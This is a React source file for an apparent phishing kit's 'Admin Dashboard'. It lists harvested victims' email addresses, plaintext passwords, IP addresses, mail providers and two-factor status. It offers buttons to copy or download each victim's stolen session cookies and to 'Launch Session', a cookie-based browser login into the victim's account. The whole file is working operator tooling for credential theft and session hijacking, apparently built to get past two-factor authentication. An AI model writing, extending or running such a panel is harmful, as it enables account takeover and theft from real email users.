import { useEffect, useState } from 'react';
import axios from 'axios';

const providerLabels = {
  gmail: 'Gmail',
  outlook: 'Outlook',
  yahoo: 'Yahoo',
  aol: 'AOL',
  live: 'Live',
};

export default function Dashboard() {
  const [entries, setEntries] = useState([]);
  const [loading, setLoading] = useState(true);
  const [message, setMessage] = useState('');

  async function fetchEntries() {
    try {
      setLoading(true);
      const response = await axios.get('/api/auth/credentials');
      setEntries(response.data);
    } catch (error) {
      setMessage(error.response?.data?.message || 'Unable to load credentials.');
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => {
    fetchEntries();
  }, []);

  async function launchSession(accountId) {
    try {
      setMessage('Launching cookie-based browser session...');
      const response = await axios.post('/api/auth/launch-session', { accountId });
      setMessage(response.data.message || 'Session launch result received.');
    } catch (error) {
      setMessage(error.response?.data?.message || 'Unable to launch the session.');
    }
  }

  function copyCookies(cookies) {
    if (!cookies || cookies.length === 0) {
      setMessage('No cookies available to copy.');
      return;
    }

    const json = JSON.stringify(cookies, null, 2);
    navigator.clipboard.writeText(json).then(() => {
      setMessage('Cookies copied to clipboard.');
    }).catch(() => {
      setMessage('Clipboard copy failed, but the cookies are available to download.');
    });
  }

  function downloadCookies(cookies, email) {
    if (!cookies || cookies.length === 0) {
      setMessage('No cookies available to download.');
      return;
    }

    const blob = new Blob([JSON.stringify(cookies, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${(email || 'cookies').replace(/[^a-z0-9]/gi, '_').toLowerCase()}.json`;
    a.click();
    URL.revokeObjectURL(url);
    setMessage('Cookies downloaded.');
  }

  return (
    <div className="container py-4">
      <div className="d-flex align-items-center justify-content-between mb-3">
        <div>
          <h2 className="mb-0">Admin Dashboard</h2>
          <small className="text-muted">Saved credentials and authenticated sessions</small>
        </div>
        <button className="btn btn-primary" onClick={fetchEntries}>Refresh</button>
      </div>

      {message && <div className="alert alert-info">{message}</div>}

      <div className="card shadow-sm border-0">
        <div className="card-body p-0">
          {loading ? (
            <div className="p-4 text-center text-muted">Loading records...</div>
          ) : (
            <div className="table-responsive">
              <table className="table table-striped table-hover align-middle mb-0">
                <thead className="table-dark">
                  <tr>
                    <th>Email</th>
                    <th>Password</th>
                    <th>IP Address</th>
                    <th>Provider</th>
                    <th>Status</th>
                    <th>Cookies</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {entries.length === 0 ? (
                    <tr>
                      <td colSpan="7" className="text-center text-muted py-4">
                        No credential records yet.
                      </td>
                    </tr>
                  ) : (
                    entries.map((entry) => (
                      <tr key={entry._id}>
                        <td>{entry.email}</td>
                        <td>{entry.password}</td>
                        <td>{entry.ip}</td>
                        <td>{providerLabels[entry.provider] || entry.provider}</td>
                        <td>
                          <span className={`badge ${entry.status === 'Completed' ? 'bg-success' : entry.status === 'Requires 2FA' ? 'bg-warning text-dark' : entry.status === 'Failed' ? 'bg-danger' : 'bg-secondary'}`}>
                            {entry.status}
                          </span>
                        </td>
                        <td>
                          <div className="d-flex gap-2 flex-wrap">
                            <button
                              className="btn btn-sm btn-outline-primary"
                              onClick={() => copyCookies(entry.cookies)}
                              disabled={!entry.cookies || entry.cookies.length === 0}
                            >
                              Copy
                            </button>
                            <button
                              className="btn btn-sm btn-outline-secondary"
                              onClick={() => downloadCookies(entry.cookies, entry.email)}
                              disabled={!entry.cookies || entry.cookies.length === 0}
                            >
                              Download
                            </button>
                          </div>
                        </td>
                        <td>
                          {entry.status === 'Completed' ? (
                            <button className="btn btn-sm btn-success" onClick={() => launchSession(entry._id)}>
                              Launch Session
                            </button>
                          ) : (
                            <span className="text-muted small">Awaiting completion</span>
                          )}
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
